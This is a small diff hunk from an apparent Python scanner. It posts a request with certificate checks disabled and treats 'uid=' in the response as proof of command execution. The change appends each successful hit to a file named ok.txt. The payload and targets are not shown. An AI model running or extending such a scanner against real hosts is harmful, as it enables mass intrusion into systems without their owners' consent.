@@ -16,5 +16,6 @@ aa=requests.post(url,headers=headers,data=data,verify=False).text
 
 if "uid=" in str(aa):
 	print ("yes",url)
+	with open("ok.txt",'a') as file: file.write(aa+'\n') 
 else:
 	print ("no")
